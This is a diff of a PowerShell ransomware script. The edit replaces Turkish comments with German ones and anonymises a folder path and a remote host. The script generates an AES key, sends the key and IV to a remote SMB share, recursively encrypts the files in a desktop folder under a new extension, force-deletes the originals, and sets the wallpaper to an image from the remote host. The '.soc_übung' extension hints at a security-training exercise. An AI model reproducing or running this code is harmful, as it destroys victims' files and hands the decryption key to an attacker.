@@ -1,32 +1,32 @@
-﻿# Klasör yolu ve şifreleme anahtarı
-$folderPath = "C:\Users\Calculus\Desktop\foo"
-$encryptionKey = New-Object Byte[] 32  # Rastgele 32 bayt (256 bit) anahtar oluştur
+#wir stellen erstmal fest, welches Folder wir verschlüsseln..
+$folderPath = "C:\Users\username\Desktop\folder"
+$encryptionKey = New-Object Byte[] 32  
 [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($encryptionKey)
 
-# AES şifreleme nesnesini oluştur
+# Verschlüsseln-Algorithmus-AES 
 $aesManaged = New-Object System.Security.Cryptography.AesManaged
 $aesManaged.Key = $encryptionKey
 $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
 $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
 
-# IV (Initialization Vector) otomatik olarak oluşturulur
+# IV (Initialization Vector) 
 $IV = $aesManaged.IV
 
-# Anahtar ve IV'yi güvenli bir şekilde sakla
-$keyFile = "\\192.168.43.157\smb\encryptionKey.bin"
-$ivFile = "\\192.168.43.157\smb\encryptionIV.bin"
+# encryption-key and IV speichern auf Webservern
+$keyFile = "\hostname:port\victory\encryptionKey.bin"
+$ivFile = "\hostname:port\victory\encryptionIV.bin"
 [System.IO.File]::WriteAllBytes($keyFile, $aesManaged.Key)
 [System.IO.File]::WriteAllBytes($ivFile, $aesManaged.IV)
 
-# Belirtilen klasördeki dosyaları şifrele ve orijinal dosyaları sil
-Get-ChildItem -Path $folderPath -Recurse | Where-Object { -Not $_.PSIsContainer -and $_.Extension -ne ".gogo" } | ForEach-Object {
+# verschlüsseln ausgewählte Dateien und orginelle erbeugen, dann orginelle löschen
+Get-ChildItem -Path $folderPath -Recurse | Where-Object { -Not $_.PSIsContainer -and $_.Extension -ne ".soc_übung" } | ForEach-Object {
     $inputFile = $_.FullName
-    $outputFile = "$inputFile.gogo"
+    $outputFile = "$inputFile.soc_übung"
 
-    # Dosya içeriğini oku
+    # auslesen die Inhalte der Datei 
     $content = [System.IO.File]::ReadAllBytes($inputFile)
 
-    # Şifreleyici nesneyi oluştur ve veriyi şifrele
+    # verschlüsseln Datei
     $encryptor = $aesManaged.CreateEncryptor($aesManaged.Key, $aesManaged.IV)
     $encryptedData = $encryptor.TransformFinalBlock($content, 0, $content.Length)
 
@@ -34,7 +34,7 @@ Get-ChildItem -Path $folderPath -Recurse | Where-Object { -Not $_.PSIsContainer 
     $fileData = $IV + $encryptedData
     [System.IO.File]::WriteAllBytes($outputFile, $fileData)
 
-    # Orijinal dosyayı sil
+    # Löschen Orginelle Datei
     Remove-Item $inputFile -Force
 
     # Şifreleyici nesneyi temizle
@@ -44,7 +44,7 @@ Get-ChildItem -Path $folderPath -Recurse | Where-Object { -Not $_.PSIsContainer 
 # AES nesnesini temizle
 $aesManaged.Dispose()
 
-# Masaüstü arka planını değiştir
+# ändern Wallpaper
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -56,5 +56,5 @@ public class Wallpaper {
 "@
 
 # Yeni wallpaper yolu
-$newWallpaperPath = "\\192.168.43.157\smb\gogo.png"
+$newWallpaperPath = "\hostname:port\victory\gogo.png"
 [Wallpaper]::SystemParametersInfo(0x0014, 0, $newWallpaperPath, 0x01 -bor 0x02)
